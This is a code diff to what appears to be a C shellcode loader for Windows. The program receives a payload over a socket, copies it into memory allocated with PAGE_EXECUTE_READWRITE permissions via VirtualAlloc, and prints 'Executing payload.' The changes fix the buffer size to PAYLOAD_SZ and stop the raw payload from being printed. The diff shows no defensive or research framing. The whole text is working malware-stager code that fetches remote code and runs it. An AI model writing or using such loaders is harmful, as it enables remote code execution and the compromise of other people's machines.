@@ -47,7 +47,7 @@ int main() {
     res = recv( ConnectSocket, buf, BUF_LEN, 0 );
     if (res > 0) {
       strcat(data, buf);
-      printf(data);
+      printf(".");
     }
     else if (res == 0) {
       break;
@@ -57,11 +57,11 @@ int main() {
     }
   } while (res > 0);
   printf("Received payload with size of %d.\n", recvd);
-
+  //printf(data);
   printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
-  void* rwx = VirtualAlloc(NULL, BUF_LEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  memcpy(rwx, data, BUF_LEN);
+  void* rwx = VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  memcpy(rwx, data, PAYLOAD_SZ);
   // VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, 0);
 
   printf("Executing payload.\n");
